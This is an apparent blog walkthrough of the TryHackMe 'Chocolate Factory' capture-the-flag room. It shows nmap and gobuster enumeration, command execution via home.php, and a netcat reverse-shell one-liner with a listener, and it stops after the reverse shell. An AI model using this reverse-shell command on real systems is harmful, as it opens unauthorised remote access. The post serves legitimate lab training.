---
layout: post
title: Tryhackme Chocolate Factory Walkthrough 
date: 2017-09-12 00:00:00 +0300
description: You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. # Add post description (optional)
img: titlephoto1.jpg # Add image post (optional)
tags: [Tryhackme, CTF] # add tag
---

Today’s blog post — I will give a walk-through on room called, “Chocolate Factory”. This is perfect practice for Beginners 

Let’s get started.
Firstly Diploy the machine and Wait a minute for get ip address to start.

![init]({{site.baseurl}}/assets/img/cholocate.tryhackme/init.png)

### Enumeration 
 > sudo nmap -sV -sC -v <ip>
  
  -sV: Probe open ports to determine service/version info
  -sC: equivalent to --script=default
   -v: verbose mode
the result like look,
 ![nmap]({{site.baseurl}}/assets/img/cholocate.tryhackme/nmap.png)  

There can see ftp running on port 21,ssh running on port 22 and webserver in port 80 Then try Open browser enter ip address default webserver running in port 80 

I trying sqlinjection but nothing changes ,So Check the directories using gobuster 
> gobuser dir -u <ip> -w /usr/share/seclists
  
OK.. Here see home.php 
 ![nmap]({{site.baseurl}}/assets/img/cholocate.tryhackme/command.ls.png)  
  try system commands then reverse connection command 
  > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
 
 remember one thing disable your ufw firewall
  listern our system 
  > nc -lvnp 
    -l listen mode, for inbound connects
    -v verbose
    -n numeric-only IP addresses, no DNS
    -p local port number
   ![nmap]({{site.baseurl}}/assets/img/cholocate.tryhackme/reverse2.png) 
   
  
 

